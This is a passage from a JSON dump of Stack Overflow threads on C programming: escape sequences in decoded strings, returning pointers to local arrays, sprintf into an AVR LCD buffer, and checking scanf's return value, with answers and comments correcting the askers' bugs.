1449672529, "post_id": 34181528, "comment_id": 56109636, "body": "Technically, this fix is sloppy as it might not handle <code>Foo\\\\nBar</code> as expected, but the OP&#39;s actual semantics are vague."}], "tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": true, "score": 3, "last_activity_date": 1449841936, "last_edit_date": 1449841936, "creation_date": 1449671932, "answer_id": 34181528, "question_id": 34181239, "link": "https://stackoverflow.com/questions/34181239/how-to-print-text-with-formatting/34181528#34181528", "title": "How to print text with formatting", "body": "<p>Your code has the following problems:</p>\n\n<ul>\n<li><p><code>fseek(f, SEEK_SET, 0);</code> serves no purpose, the file opened with <code>fopen</code> is at position 0 by default.</p></li>\n<li><p><code>fread(s, 2919, 1, f);</code>: you do not store the number of bytes read. You cannot properly null terminate the buffer for printf to stop at the last decoded byte.  How do you know the file size anyway?</p></li>\n<li><p>The encoded string <code>H4sIAIM4aFYCAwtJLS6JyQsBklwAMrDLnwsAAAA=</code> decodes as <code>Test\\nTest</code>, with a litteral <code>\\</code> character followed by an <code>n</code>, not a linefeed character. Reading these characters from file <code>r</code> with <code>fread</code> will not convert escape sequence <code>\\n</code> to the actual linefeed character.  Such conversion is a feature of the compiler when parsing string and character literals.  If you intend to do that with your file contents, you have to hand code the conversion yourself.</p></li>\n</ul>\n\n<p>Here is a corrected version:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main(void) {   \n    FILE *f;\n    char *s = malloc(2919 + 1);\n    char *p;\n    int nread;\n\n    strcpy(s, \"printf 'H4sIAIM4aFYCAwtJLS6JyQsBklwAMrDLnwsAAAA=' | base64 -d | gunzip &gt; r\"); //Test\\nTest after decoding\n    system(s);\n    f = fopen(\"r\", \"r\");\n    nread = fread(s, 2919, 1, f);\n    if (nread &gt;= 0) {\n        s[nread] = '\\0';\n        while ((p = strstr(s, \"\\\\n\")) != NULL) {\n            /* converting \\ n sequences to linefeed characters */\n            *p = '\\n';\n            memmove(p + 1, p + 2, strlen(p + 2) + 1);\n        }\n        printf(\"%s\", s); //puts(s); will not give the same result\n    }\n    fclose(f);\n    system(\"rm r\");\n    free(s);\n    return 0;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": false, "score": 4, "last_activity_date": 1449672362, "creation_date": 1449672362, "answer_id": 34181683, "question_id": 34181239, "link": "https://stackoverflow.com/questions/34181239/how-to-print-text-with-formatting/34181683#34181683", "title": "How to print text with formatting", "body": "<p>The text you've encoded looks like this:</p>\n\n<pre><code>Test\\nTest\n</code></pre>\n\n<p>This is a 10 character string with \"\\\" for the fifth character and \"n\" for the sixth.  This is different from this:</p>\n\n<pre><code>char str[]=\"Test\\nTest\";\n</code></pre>\n\n<p>Which is a 9 character string with a newline for the fifth character.</p>\n\n<p>If you want to print a newline, your encoded string needs to contain it.  Either that, or you have to parse the resulting string and perform the newline substitution manually.</p>\n"}, {"tags": [], "owner": {"reputation": 81300, "user_id": 296974, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0e26cfe3ac75cd582ca200fbc6fa0421?s=128&d=identicon&r=PG", "display_name": "glglgl", "link": "https://stackoverflow.com/users/296974/glglgl"}, "is_accepted": false, "score": 2, "last_activity_date": 1449672367, "creation_date": 1449672367, "answer_id": 34181686, "question_id": 34181239, "link": "https://stackoverflow.com/questions/34181239/how-to-print-text-with-formatting/34181686#34181686", "title": "How to print text with formatting", "body": "<p>Well, obviously, you have encoded the bytes <code>'\\'</code> and <code>'n'</code> at the respective places in the string.</p>\n\n<p>If you don't want that, you can</p>\n\n<ol>\n<li><p>either compress and encode the correct string:</p>\n\n<pre><code>$ echo $'Test\\nTest' | gzip | base64\nH4sIAEs+aFYAAwtJLS7hCgERAF0muOIKAAAA\n$ echo $'Test\\nTest' | gzip -n | base64\nH4sIAAAAAAAAAwtJLS7hCgERAF0muOIKAAAA\n</code></pre></li>\n<li><p>or somehow interpret the <code>\\n</code> in the string as wanted. But this makes everything more complicated.</p></li>\n</ol>\n"}, {"tags": [], "owner": {"reputation": 3147, "user_id": 817132, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/773b5975a02bbba1758b2bf53ac38ae7?s=128&d=identicon&r=PG", "display_name": "wally", "link": "https://stackoverflow.com/users/817132/wally"}, "is_accepted": false, "score": 2, "last_activity_date": 1449672601, "creation_date": 1449672601, "answer_id": 34181779, "question_id": 34181239, "link": "https://stackoverflow.com/questions/34181239/how-to-print-text-with-formatting/34181779#34181779", "title": "How to print text with formatting", "body": "<p>@lurker has hit the nail on the head...</p>\n\n<blockquote>\n  <p>The encoding evidently has a literal backslash and nothing in your\n  pipeline of system commands interprets it. One way to get it to\n  interpret the escapes is: \"echo -e $(printf\n  'H4sIAIM4aFYCAwtJLS6JyQsBklwAMrDLnwsAAAA=' | base64 -d | gunzip)\n  r\"</p>\n</blockquote>\n\n<p>To be a little more verbose in answering the question - specifically what's happened is you've compressed the literal ASCII (or UTF-8) characters:</p>\n\n<pre><code>T  e  s  t  \\  n  T  e  s  t\n</code></pre>\n\n<p>Given your question, you were (presumably) meaning to have either compressed a new line character (often interpreted by tools from the string <code>\\n</code>) rather than the two literal characters <code>\\</code> and <code>n</code>.</p>\n\n<p>You could create a different gzipped input.  That's one option.  I don't know how you generated the current gzipped binary data - if you post that, we can take a look and propose a fix.</p>\n\n<p>Alternatively as @lurker said - you can do something on the <em>output</em> to convert any occurrences of <code>\\</code> and <code>n</code> to newline characters - and there's lots of ways to do that.</p>\n\n<p>But it really depends on <strong>what you were trying to do</strong>.  If you thought you had zipped this text:</p>\n\n<pre><code>Test\nTest\n</code></pre>\n\n<p>...then it's the input that's gone wrong.</p>\n\n<p>If you thought you had zipped this text:</p>\n\n<pre><code>Test\\nTest\n</code></pre>\n\n<p>...(as in literally a back-slash-and-n), then you presumably are trying to add some output-processing to convert it to a real new line character.</p>\n\n<p>Does that make sense?</p>\n"}, {"tags": [], "owner": {"reputation": 28373, "user_id": 4926357, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3f559694d3ca65b39220166b865276d?s=128&d=identicon&r=PG&f=1", "display_name": "A.S.H", "link": "https://stackoverflow.com/users/4926357/a-s-h"}, "is_accepted": false, "score": 2, "last_activity_date": 1449673586, "last_edit_date": 1449673586, "creation_date": 1449672761, "answer_id": 34181841, "question_id": 34181239, "link": "https://stackoverflow.com/questions/34181239/how-to-print-text-with-formatting/34181841#34181841", "title": "How to print text with formatting", "body": "<p>The C compiler transforms the \"\\n\" sequence into a newline character (ASCII code 10) ONLY IF it is encountered in a <em>literal character string</em> (a constant presented in the source code), not in any character string variable.</p>\n\n<p>Examples:</p>\n\n<pre><code>char s1[] = \"TEST\\nTEST\";\nprintf(s1); // ---&gt; TEST newline TEST.\n\nchar s2[] = \"TEST\\\\nTEST\"; // s2 = \"TEST\\nTEST\"\nprintf(s2); // ---&gt; TEST\\nTEST (the characters \\ and n are present inside the string)\n</code></pre>\n\n<p>As you can see, in the case of <code>s1</code>, the string was first parsed by the C compiler, which then transformed <code>\\n</code> into newline. In the second case, the escape character <code>\\</code> prevented the interpretation so the string <code>s2</code> was exactly <code>TEST\\nTEST</code>, but now this is no longer a literal (given explicitly in the code), but a real character string residing in memory. Hence it will no longer be interpreted.</p>\n\n<p>Therefore, <code>printf(s2)</code> is not like <code>printf(\"TEST\\nTEST\")</code> because in the former case there is no interpretation, while in the latter case, the C compiler sees a literal and will interpret it, replacing <code>\\n</code> by <code>newline</code>.</p>\n"}], "owner": {"reputation": 95, "user_id": 2671410, "user_type": "registered", "accept_rate": 82, "profile_image": "https://graph.facebook.com/1141598977/picture?type=large", "display_name": "Kris", "link": "https://stackoverflow.com/users/2671410/kris"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 92, "favorite_count": 1, "accepted_answer_id": 34181528, "answer_count": 5, "score": 4, "last_activity_date": 1449841936, "creation_date": 1449671227, "last_edit_date": 1449671313, "question_id": 34181239, "link": "https://stackoverflow.com/questions/34181239/how-to-print-text-with-formatting", "title": "How to print text with formatting", "body": "<p>My problem is when I try to print text with a \"\\n\", this special characters are invisible for printf and puts after echoing it to file, and reading it again.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main()\n{   \n    FILE *f;\n    char *s = (char*) malloc (2919);\n    strcpy(s, \"printf 'H4sIAIM4aFYCAwtJLS6JyQsBklwAMrDLnwsAAAA=' | base64 -d | gunzip &gt; r\"); //Test\\nTest after decoding\n    system(s);\n    f = fopen(\"r\", \"r\");\n    fseek(f, SEEK_SET, 0);\n    fread(s, 2919, 1, f);\n    printf(\"%s\", s); //puts(s); gives the same result\n    fclose(f);\n    system(\"rm r\");\n    free(s);\n    return 0;\n}\n</code></pre>\n\n<p>Output should look like:</p>\n\n<pre><code>Test\nTest\n</code></pre>\n\n<p>and it looks like <code>Test\\nTest</code>. What am I doing wrong?\nLearning purpose, so please be nice.</p>\n"}, {"tags": ["c", "pointers", "char"], "comments": [{"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1449776243, "post_id": 34181068, "comment_id": 56164636, "body": "this line: <code>while(buffer[index] != &#39; &#39;){</code> exits the loop when encountering a space, not when encountering the NUL byte at the end of the string.   Then this line: <code>char filePath[numberOfChars]; 1) does not allow room for trailing NUL char.  2) is too small to hold the buffer[5] through the end of the char array.  Then this line: </code>strncpy(filePath,buffer+4,numberOfChars);` filled up the flePath[] array (without including a NUL string termination char).  Then this line: <code>strcat(fullPath,name);</code> adds yet more characters, &#39;somewhere&#39; beyond the end of the filePath[] array.  ==undefined behaviour"}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 0, "creation_date": 1449779187, "post_id": 34181068, "comment_id": 56166290, "body": "You are using <code>strncpy</code> incorrectly - check its manual to see why"}], "answers": [{"comments": [{"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1449776498, "post_id": 34181186, "comment_id": 56164754, "body": "the filePath[] array has not been properly terminated, so the call to <code>strlen()</code> will fail to return the correct value."}, {"owner": {"reputation": 106438, "user_id": 1275169, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/4c6dbda4e65af6d2ceaabdfad538b319?s=128&d=identicon&r=PG&f=1", "display_name": "P.P", "link": "https://stackoverflow.com/users/1275169/p-p"}, "reply_to_user": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1449777656, "post_id": 34181186, "comment_id": 56165413, "body": "@user3629249 Thanks. I have updated to cover this. Hopefully, it&#39;s better now."}], "tags": [], "owner": {"reputation": 106438, "user_id": 1275169, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/4c6dbda4e65af6d2ceaabdfad538b319?s=128&d=identicon&r=PG&f=1", "display_name": "P.P", "link": "https://stackoverflow.com/users/1275169/p-p"}, "is_accepted": true, "score": 1, "last_activity_date": 1449777630, "last_edit_date": 1449777630, "creation_date": 1449671056, "answer_id": 34181186, "question_id": 34181068, "link": "https://stackoverflow.com/questions/34181068/changing-pointer-char-value-in-function/34181186#34181186", "title": "Changing pointer char value in function", "body": "<pre><code>char filePath[numberOfChars];    \nchar* fullPath;\nfullPath = filePath; \n....\n(*newPath) = fullPath;\n</code></pre>\n\n<p><code>filePath</code> has automatic storage duration and you are accessing it after its lifetime is over. This is <a href=\"https://en.wikipedia.org/wiki/Undefined_behavior\" rel=\"nofollow\"><em>undefined behaviour</em></a>.</p>\n\n<p>Instead, you could use <a href=\"http://man7.org/linux/man-pages/man3/malloc.3.html\" rel=\"nofollow\"><code>malloc()</code></a> and <code>strcpy()</code> to copy the string into <code>*newPath</code>.</p>\n\n<p>Replace </p>\n\n<pre><code>(*newPath) = fullPath;\n</code></pre>\n\n<p>with:</p>\n\n<pre><code>*newPath = malloc(strlen(fullPath) + 1);\n if (*newPath == NULL) {\n    /* handle error */\n }\nstrcpy(*newPath, fullPath);\n</code></pre>\n\n<p>and call <a href=\"http://man7.org/linux/man-pages/man3/malloc.3.html\" rel=\"nofollow\"><code>free()</code></a> in <code>main()</code> to de-allocate it.</p>\n\n<hr>\n\n<p>As noted in the comments, you need to allocate one extra byte for the <code>'\\0'</code> terminator. You can handle this by allocating an extra byte:</p>\n\n<pre><code>char filePath[numberOfChars + 1];    \nstrncpy(filePath,buffer+4,numberOfChars);\nfilePath[numberOfChars] = '\\0';\n</code></pre>\n\n<p><code>strncpy()</code> automatically fills rest of the with the memory with NUL bytes. In this case, just the last byte. In general, you don't want to use <code>strncpy()</code> as that would be unnecessary to fill the rest of the buffer with NUL bytes.</p>\n"}, {"comments": [{"owner": {"reputation": 45, "user_id": 5020308, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/065923c3882a10984352e0bfd8458a53?s=128&d=identicon&r=PG&f=1", "display_name": "user012225474", "link": "https://stackoverflow.com/users/5020308/user012225474"}, "edited": false, "score": 0, "creation_date": 1449671858, "post_id": 34181227, "comment_id": 56109076, "body": "Thank you but @l3x was first."}], "tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": false, "score": 1, "last_activity_date": 1449671203, "creation_date": 1449671203, "answer_id": 34181227, "question_id": 34181068, "link": "https://stackoverflow.com/questions/34181068/changing-pointer-char-value-in-function/34181227#34181227", "title": "Changing pointer char value in function", "body": "<p>You're returning a pointer to a local variable.  When the function exits, that variable goes out of scope and the memory it occupied can be used for other purposes, leading to <a href=\"https://en.wikipedia.org/wiki/Undefined_behavior\" rel=\"nofollow\">undefined behavior</a>.</p>\n\n<p>Your function needs to dynamically allocate space for the string (and the NULL terminator) and return a pointer to that buffer.  You then need to be sure to <code>free</code> it in the calling function:</p>\n\n<pre><code>int parser(char* buffer,char **newPath) {\n    ....\n    char *filePath = malloc(numberOfChars+1);\n    if (filePath == NULL) {\n        perror(\"malloc failed\");\n        exit(1);\n    }\n    ...\n}\n\nint main(int argc, char *argv[])\n{ \n    ...\n    parser(msg,&amp;path);\n    printf(\"In main path=%s\\n\",path);\n    free(path);\n}\n</code></pre>\n"}], "owner": {"reputation": 45, "user_id": 5020308, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/065923c3882a10984352e0bfd8458a53?s=128&d=identicon&r=PG&f=1", "display_name": "user012225474", "link": "https://stackoverflow.com/users/5020308/user012225474"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 53, "favorite_count": 0, "accepted_answer_id": 34181186, "answer_count": 2, "score": 2, "last_activity_date": 1449777630, "creation_date": 1449670728, "question_id": 34181068, "link": "https://stackoverflow.com/questions/34181068/changing-pointer-char-value-in-function", "title": "Changing pointer char value in function", "body": "<p>I try to parse client HTML GET request and get address of file he wants to send. But when i pass argument to function  in path variable is bad output.\nParsers function printf: <code>New file path returned is=/somedir/index.html</code>\nMain fuction printf: <code>In main path=random chars</code></p>\n\n<p>What is wrong?</p>\n\n<pre><code>int parser(char* buffer,char **newPath)\n{\nint numberOfChars = 0;\nint index = 4;//start at 4 char\n\nwhile(buffer[index] != ' '){\n            numberOfChars++;\n            index++;\n}\n// in numberOfChars is number of path characters from while loop\n// this part of code is in if statment but it is irrelevant now\nchar filePath[numberOfChars];    \nstrncpy(filePath,buffer+4,numberOfChars);\nchar* fullPath;\nfullPath = filePath;                \nchar name[] = \"index.html\";\nstrcat(fullPath,name);\n\n(*newPath) = fullPath;\nprintf(\"New file path returned is=%s\\n\",(*newPath));\nreturn 1;\n//some more code if file is .sh or .bash or .png ...\n.\n.\n}\n</code></pre>\n\n<p>main</p>\n\n<pre><code>int main(int argc, char *argv[])\n{\n            //some code\n            .\n            .\n            .\n            char* path;\n            //msg is client HTML get request i want parse it and send data\n            // which he wants\n            parser(msg,&amp;path);\n            printf(\"In main path=%s\\n\",path);\n}\n</code></pre>\n"}, {"tags": ["c", "string", "printf", "avr", "lcd"], "comments": [{"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 1, "creation_date": 1449670580, "post_id": 34180951, "comment_id": 56108129, "body": "your <code>char *text[20];</code> is an array of twenty uninitialized <i>pointers</i>"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1449670605, "post_id": 34180951, "comment_id": 56108148, "body": "Note: Don&#39;t use the stream-functions on AVR or similar MCUs. They are far too clumsy and bloat. Write your own small conversion functions."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1449670643, "post_id": 34180951, "comment_id": 56108187, "body": "You are confusing arrays and pointers."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1449670893, "post_id": 34180951, "comment_id": 56108366, "body": "You need to implement signal debouncing to dodge the electro-mechanical bounce you get from all buttons."}], "answers": [{"comments": [{"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 1, "creation_date": 1449670905, "post_id": 34181018, "comment_id": 56108370, "body": "` sprintf(*text, ...` should be modified to ` sprintf(text, ...` as well"}, {"owner": {"reputation": 3723, "user_id": 1169091, "user_type": "registered", "accept_rate": 9, "profile_image": "https://i.stack.imgur.com/5vE4L.jpg?s=128&g=1", "display_name": "nicomp", "link": "https://stackoverflow.com/users/1169091/nicomp"}, "reply_to_user": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 1, "creation_date": 1449671107, "post_id": 34181018, "comment_id": 56108499, "body": "Good catch @chqrlie , and the * needs to be removed from lcd_send_string(&amp;myLCD, *text, 1, 1);"}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1449672891, "post_id": 34181018, "comment_id": 56109926, "body": "@tinky_winky: <code>%u</code> is not actually required: <code>(unsigned char)buttons</code> is implicitly converted and passed as an <code>int</code>."}], "tags": [], "owner": {"reputation": 3723, "user_id": 1169091, "user_type": "registered", "accept_rate": 9, "profile_image": "https://i.stack.imgur.com/5vE4L.jpg?s=128&g=1", "display_name": "nicomp", "link": "https://stackoverflow.com/users/1169091/nicomp"}, "is_accepted": false, "score": 1, "last_activity_date": 1449670580, "creation_date": 1449670580, "answer_id": 34181018, "question_id": 34180951, "link": "https://stackoverflow.com/questions/34180951/copy-text-using-sprintf-into-char-array-c-atmel-studio-7/34181018#34181018", "title": "Copy text using sprintf() into char array - C / Atmel studio 7", "body": "<p>text should be</p>\n\n<pre><code>char text[20];\n</code></pre>\n\n<p>Take off the *</p>\n"}, {"tags": [], "owner": {"reputation": 27359, "user_id": 1141471, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/t1JZE.png?s=128&g=1", "display_name": "4pie0", "link": "https://stackoverflow.com/users/1141471/4pie0"}, "is_accepted": true, "score": 1, "last_activity_date": 1449672743, "last_edit_date": 1449672743, "creation_date": 1449670936, "answer_id": 34181146, "question_id": 34180951, "link": "https://stackoverflow.com/questions/34180951/copy-text-using-sprintf-into-char-array-c-atmel-studio-7/34181146#34181146", "title": "Copy text using sprintf() into char array - C / Atmel studio 7", "body": "<pre><code>char *text[20];\n</code></pre>\n\n<p>is an array of 20 pointers to <code>char</code>. In line</p>\n\n<pre><code>sprintf(*text, \"Pushed Buttons %d\", (unsigned char) buttons);\n</code></pre>\n\n<p>you are trying to use <code>sprintf</code> to put text into <code>*text</code>, which is first entry of array, a pointer to char. Uninitialized pointer.</p>\n\n<p>What you want is</p>\n\n<pre><code>char text[20];\nsprintf(text, \"Pushed Buttons %d\", (unsigned char) buttons);\n</code></pre>\n\n<p>an array of 20 characters.</p>\n"}], "owner": {"reputation": 41, "user_id": 4237450, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a522077b90cd8f33523cbd72c6de39b7?s=128&d=identicon&r=PG&f=1", "display_name": "Jordan181", "link": "https://stackoverflow.com/users/4237450/jordan181"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 3222, "favorite_count": 0, "accepted_answer_id": 34181146, "answer_count": 2, "score": 1, "last_activity_date": 1449672743, "creation_date": 1449670399, "last_edit_date": 1449670867, "question_id": 34180951, "link": "https://stackoverflow.com/questions/34180951/copy-text-using-sprintf-into-char-array-c-atmel-studio-7", "title": "Copy text using sprintf() into char array - C / Atmel studio 7", "body": "<p>I have got the following problem: \nswitches shall be pushed and transmit signal via input pins of Port A shifted for 1 position to Port B (worked as planned). now the program shall count the buttons pushed and print that text to a small LCD display.</p>\n\n<p>When I try to save a text to an array using sprintf I get nothing written into the memory location. What am I doing wrong? Note: we should use sprintf for the solution.</p>\n\n<pre><code>#include \"avr/io.h\"\n#include \"stdint.h\"\n#include \"lcd.h\"\n#include \"stdio.h\"\n\nint main(void) {\n    unsigned char mask, presetb;\n    char *text[20];\n    unsigned char buttons;\n\n    //variable to save lcd infos\n    display myLCD;\n\n    //set pointer to DDRA &amp; set to Input(0)\n    DDRA &amp;= ~((1 &lt;&lt; DDA2) | (1 &lt;&lt; DDA3) | (1 &lt;&lt; DDA4) | (1 &lt;&lt; DDA5)); //sets bits 2 to 5 to 0\n\n    //set ptr to DDRB and set as output (1)\n    DDRB |= ((1 &lt;&lt; DDB3) | (1 &lt;&lt; DDB4) | (1 &lt;&lt; DDB5) | (1 &lt;&lt; DDB6)); //sets bits 3 to 6 to 1\n\n    //initialize LCD\n    lcd_init(&amp;myLCD, &amp;PORTD);\n\n    for (;;) {\n        //set pointer to PINA &amp; read bits 2 to 5, save in 'mask' and shift number &lt;&lt;1\n        mask = PINA &amp; ((1 &lt;&lt; PIN2) | (1 &lt;&lt; PIN3) | (1 &lt;&lt; PIN4) | (1 &lt;&lt; PIN5));\n        mask = mask &lt;&lt; 1;\n\n        //set ptr to PORTB and copy shifted number\n        presetb = (~((1 &lt;&lt; PIN3) | (1 &lt;&lt; PIN4) | (1 &lt;&lt; PIN5) | (1 &lt;&lt; PIN6))) &amp; (PORTB); //save bitvalues of bits 0 - 2 and 7\n        PORTB = (mask | presetb); //copy bits 0-2 and 7 of 'presetb' and bits 3 -6 of 'mask' to PORTB\n\n        //number of buttons pressed\n        buttons = 0;\n\n        if (PINB3 == 1)\n            buttons += 1;\n\n        if (PINB4 == 1)\n            buttons += 1;\n\n        if (PINB5 == 1)\n            buttons += 1;\n\n        if (PINB6 == 1)\n            buttons += 1;\n\n        //set string\n        sprintf(*text, \"Pushed Buttons %d\", (unsigned char)buttons);\n\n        //print text \"Pushed Buttons [Nbr]\"\n        lcd_send_string(&amp;myLCD, *text, 1, 1);\n    }\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "string", "error-handling"], "comments": [{"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1449670225, "post_id": 34180726, "comment_id": 56107833, "body": "Please edit your post and fix the indention."}], "answers": [{"tags": [], "owner": {"reputation": 26680, "user_id": 1806780, "user_type": "registered", "accept_rate": 0, "profile_image": "https://i.stack.imgur.com/NCB41.jpg?s=128&g=1", "display_name": "Sami Kuhmonen", "link": "https://stackoverflow.com/users/1806780/sami-kuhmonen"}, "is_accepted": false, "score": 2, "last_activity_date": 1449669967, "creation_date": 1449669967, "answer_id": 34180799, "question_id": 34180726, "link": "https://stackoverflow.com/questions/34180726/handling-errors-infinite-loops/34180799#34180799", "title": "Handling errors, infinite loops", "body": "<p><code>scanf()</code> returns a value indicating how many values were successfully read. If it is zero, it means nothing could be read. You should use this value to check for errors in input.</p>\n"}, {"comments": [{"owner": {"reputation": 6288, "user_id": 1455631, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d9b8e88a8dbed8a574ed79d075c3f924?s=128&d=identicon&r=PG", "display_name": "Medinoc", "link": "https://stackoverflow.com/users/1455631/medinoc"}, "edited": false, "score": 0, "creation_date": 1449670529, "post_id": 34180860, "comment_id": 56108090, "body": "Ideally, the getchar() loop should also check for EOF, or it runs the risk of running indefinitely."}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "reply_to_user": {"reputation": 6288, "user_id": 1455631, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d9b8e88a8dbed8a574ed79d075c3f924?s=128&d=identicon&r=PG", "display_name": "Medinoc", "link": "https://stackoverflow.com/users/1455631/medinoc"}, "edited": false, "score": 0, "creation_date": 1449670594, "post_id": 34180860, "comment_id": 56108136, "body": "@Medinoc Good call.  Edited."}], "tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": true, "score": 2, "last_activity_date": 1449670583, "last_edit_date": 1449670583, "creation_date": 1449670155, "answer_id": 34180860, "question_id": 34180726, "link": "https://stackoverflow.com/questions/34180726/handling-errors-infinite-loops/34180860#34180860", "title": "Handling errors, infinite loops", "body": "<p>You need to check the return value of <code>scanf</code>, which returns the number of input items matched and assigned.  If you enter text, it doesn't match anything and the text is left in the input buffer.  So <code>scanf</code> keeps trying to read the same non-matching data on each iteration of the loop.</p>\n\n<p>By checking the return value, you can tell whether or not a string was entered.  You'll also need to flush out the input buffer by calling <code>getchar</code> until you get a newline.</p>\n\n<p>Try this instead:</p>\n\n<pre><code>  int items = scanf(\"%d\", &amp;height);\n\n  if (items &lt; 1) {\n      int ch;\n      printf(\"Please enter a number\\n\");\n      while (((ch=getchar()) != '\\n') &amp;&amp; (ch != EOF));\n  else if(height &lt;= 0)\n  ...\n</code></pre>\n"}], "owner": {"reputation": 149, "user_id": 4823319, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-6l3VlRzW4u0/AAAAAAAAAAI/AAAAAAAAAB4/h6zHPx0FhLM/photo.jpg?sz=128", "display_name": "Tony Lancer", "link": "https://stackoverflow.com/users/4823319/tony-lancer"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 49, "favorite_count": 0, "accepted_answer_id": 34180860, "answer_count": 2, "score": 0, "last_activity_date": 1522156796, "creation_date": 1449669788, "last_edit_date": 1522156796, "question_id": 34180726, "link": "https://stackoverflow.com/questions/34180726/handling-errors-infinite-loops", "title": "Handling errors, infinite loops", "body": "<p>This creates a mario-like pyramid when the height is entered.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main(void)\n{\n  int height;\n  char signal = 'n';\n\n  while (signal != 'y')\n  {\n    printf(\"Height: \");\n    scanf(\"%d\", &amp;height);\n\n    if 